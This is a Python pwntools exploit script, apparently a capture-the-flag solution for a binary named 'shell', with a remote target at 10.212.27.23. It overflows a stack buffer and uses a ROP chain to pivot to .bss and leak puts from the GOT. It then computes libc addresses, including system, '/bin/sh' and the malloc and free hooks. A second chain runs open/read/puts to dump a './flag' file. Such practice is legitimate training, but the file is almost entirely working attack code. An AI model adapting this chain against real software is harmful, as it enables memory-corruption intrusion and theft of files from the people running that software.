from pwn import *
from LibcSearcher import *
import re
import os
import time

def ret2libc(func, leak, path=''):
	libc_dist = {}
	if path == '':
		libc = LibcSearcher(func, leak)
		libc_dist['libc_base']    = leak - libc.dump(func)
		libc_dist['system']       = libc_dist['libc_base'] + libc.dump('system')
		libc_dist['str_bin_sh']   = libc_dist['libc_base'] + libc.dump('str_bin_sh')
		libc_dist['free']         = libc_dist['libc_base'] + libc.dump('free')
		libc_dist['realloc']      = libc_dist['libc_base'] + libc.dump('realloc')
		libc_dist['realloc_hook'] = libc_dist['libc_base'] + libc.dump('__realloc_hook')
		libc_dist['malloc_hook']  = libc_dist['libc_base'] + libc.dump("__malloc_hook")
		libc_dist['free_hook']    = libc_dist['libc_base'] + libc.dump("__free_hook")
		libc_dist['open']         = libc_dist['libc_base'] + libc.dump('open')
		libc_dist['openat']       = libc_dist['libc_base'] + libc.dump('openat')
		libc_dist['write']        = libc_dist['libc_base'] + libc.dump('write')
		libc_dist['read']         = libc_dist['libc_base'] + libc.dump('read')
		libc_dist['setcontext']   = libc_dist['libc_base'] + libc.dump('setcontext') + 53
	else:
		libc = ELF(path)
		libc_dist['libc_base']    = leak - libc.symbols[func]
		libc_dist['system']       = libc_dist['libc_base'] + libc.symbols['system']
		libc_dist['str_bin_sh']   = libc_dist['libc_base'] + next(libc.search(b'/bin/sh'))
		libc_dist['free']         = libc_dist['libc_base'] + libc.symbols['free']
		libc_dist['realloc']      = libc_dist['libc_base'] + libc.symbols['realloc']
		libc_dist['realloc_hook'] = libc_dist['libc_base'] + libc.symbols['__realloc_hook']
		libc_dist['malloc_hook']  = libc_dist['libc_base'] + libc.symbols['__malloc_hook']
		libc_dist['free_hook']    = libc_dist['libc_base'] + libc.symbols['__free_hook']
		libc_dist['open']         = libc_dist['libc_base'] + libc.symbols['open']
		libc_dist['openat']       = libc_dist['libc_base'] + libc.symbols['openat']
		libc_dist['write']        = libc_dist['libc_base'] + libc.symbols['write']
		libc_dist['read']         = libc_dist['libc_base'] + libc.symbols['read']
		libc_dist['setcontext']   = libc_dist['libc_base'] + libc.sym['setcontext'] + 53
	return libc_dist

s         = lambda data               :p.send(data)
sa        = lambda delim,data         :p.sendafter(delim, data)
sl        = lambda data               :p.sendline(data)
sla       = lambda delim,data         :p.sendlineafter(delim, data)
r         = lambda num=4096           :p.recv(num)
rt        = lambda delims, timeout=1  :p.recvuntil(delims, timeout = timeout, drop=False)
ru        = lambda delims, drop=False :p.recvuntil(delims, drop)
rall      = lambda                    :p.recvall()
can_recv  = lambda timeout=1          :p.can_recv(timeout = timeout)
uu32      = lambda data               :u32(data.ljust(4,b'\x00'))
uu64      = lambda data               :u64(data.ljust(8,b'\x00'))
leak      = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
itr       = lambda                    :p.interactive()

def dbg():
	# gdb.attach(p)
	gdb.attach(p,'b *0x004007FB')
	# gdb.attach(p,'b *$rebase(0x)')
	pause()
	
filePath = './shell'
local_x86_libc = '/lib/i386-linux-gnu/libc.so.6'
local_x64_libc = '/lib/x86_64-linux-gnu/libc.so.6'
elf = ELF(filePath)
context.log_level = 'debug'
context.os = 'linux'
context.arch = elf.arch
context.terminal = ['tmux','splitw','-h']
debug = 1

if debug==0:
	p = remote("10.212.27.23", 4396)
elif debug==1:
	p = process(filePath)

pop_rdi_ret = 0x0000000000400863
pop_rsi_pop_r15_ret = 0x0000000000400861
leave_ret = 0x000000000040075B
got_puts = elf.got['puts']
plt_puts = elf.plt['puts']
plt_read = elf.plt['read']
bss_address = 0x601100
start       = 0x00000000004007BC

# dbg()
payload1  = b'a'*0x20 + p64(bss_address)
payload1 += p64(pop_rdi_ret) + p64(got_puts)
payload1 += p64(plt_puts) 
payload1 += p64(pop_rdi_ret) + p64(0)
payload1 += p64(pop_rsi_pop_r15_ret) + p64(bss_address) + p64(0)
payload1 += p64(plt_read) + p64(leave_ret)
sla("soft! try me :)\n",payload1)
ru(b"let me guess\n")

puts = uu64(r(6))
leak("puts",puts)
print(puts)
#=============================local ============================
libc_dist = ret2libc("puts",puts,local_x64_libc)

#=============================remote ============================
#libc_dist = ret2libc("puts",puts,"./libc-2.27.so")

open_address = libc_dist['open']
read_address = libc_dist['read']

payload2  =  b'a'*0x8
payload2 += p64(pop_rdi_ret) + p64(bss_address+0x70+0x18)
payload2 += p64(pop_rsi_pop_r15_ret) + p64(0) + p64(0)
payload2 += p64(open_address)
payload2 += p64(pop_rdi_ret) + p64(0x3)
payload2 += p64(pop_rsi_pop_r15_ret) + p64(bss_address+0x200) + p64(0)
payload2 += p64(plt_read)
payload2 += p64(pop_rdi_ret) + p64(bss_address+0x200)
payload2 += p64(plt_puts) + p64(start)
payload2 += b'./flag\x00\x00'
time.sleep(1)
sl(payload2)
p.interactive()
